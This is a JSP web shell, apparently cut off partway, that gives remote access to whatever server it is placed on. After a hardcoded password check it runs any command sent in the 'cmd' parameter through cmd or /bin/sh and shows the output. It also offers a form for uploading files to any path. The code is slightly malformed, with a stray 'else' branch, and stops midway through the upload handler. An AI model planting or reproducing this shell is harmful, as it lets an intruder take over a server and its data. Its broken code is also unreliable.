<%@ page import="java.util.*,java.io.*,java.net.*,sun.misc.BASE64Decoder"%>
<%
String pass = "secret";
String cmd;
String[] cmdary;
String OS = System.getProperty("os.name");
String html_header = "<html>\n"
                   + "<body>\n"
                   + "Enter command:\n"
                   + "<form method=\"GET\" name=\"cmdform\" action=\"\">\n"
                   + "<input type=\"text\" width=\"50\" name=\"cmd\">\n"
                   + "<input type=\"hidden\" name=\"html\" value=\"true\">\n"
                   + "<input type=\"hidden\" name=\"pass\" value=\"" + URLEncoder.encode(pass) + "\">\n"
                   + "<input type=\"submit\" value=\"Run\">\n"
                   + "</form>\n"
                   + "<form method=\"POST\" name=\"fileform\" enctype=\"multipart/form-data\" action=\"\">\n"
                   + "Enter File to upload:<br />\n"
                   + "<input type=\"file\" name=\"uploadfile\"><br />\n"
                   + "Enter Path to save file:<br />\n"
                   + "<input type=\"text\" name=\"filepath\"><br />\n"
                   + "<input type=\"checkbox\" name=\"b64\"><br />\n"
                   + "<input type=\"submit\" value=\"Upload\">\n"
                   + "</form>\n"
                   + "<pre>\n";
String html_footer = "</pre>\n"
                   + "</body>\n"
                   + "</html>\n";
if (request.getParameter("pass") != null) {
  if (URLDecoder.decode(request.getParameter("pass")).equals(pass)) {
    if (request.getParameter("html") != null) {
      out.println(html_header);
    }
    if (request.getParameter("cmd") != null) {
      else {
        cmd = new String (request.getParameter("cmd"));
      }
      if (OS.startsWith("Windows")) {
       cmdary = new String [] {"cmd", "/C", cmd};
      }
      else {
       cmdary = new String [] {"/bin/sh", "-c", cmd};
      }
      Process p = Runtime.getRuntime().exec(cmdary);
      OutputStream os = p.getOutputStream();
      InputStream in = p.getInputStream();
      DataInputStream dis = new DataInputStream(in);
      String disr = dis.readLine();
      while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
      }
    }
    String contentType = request.getContentType();
    if ((contentType != null) && (contentType.indexOf("multipart/form-data") >= 0)) {
      DataInputStream in = new DataInputStream(request.getInputStream());
      int formDataLength = request.getContentLength();
      byte dataBytes[] = new byte[formDataLength];
      int byteRead = 0;
      int totalBytesRead = 0;
      while (totalBytesRead < formDataLength) {
        byteRead = in.read(dataBytes, totalBytesRead, formDataLength);
        totalBytesRead += byteRead;
        }
      String formdata = new String(dataBytes);
      String boundary = formdata.substring(0,formdata.indexOf("\n", 0) - 1);
      String content = "";
      int bpos = -1;
      int cdl = -1;
      int cdle = -1;
      String cdll;
      int ctls = -1;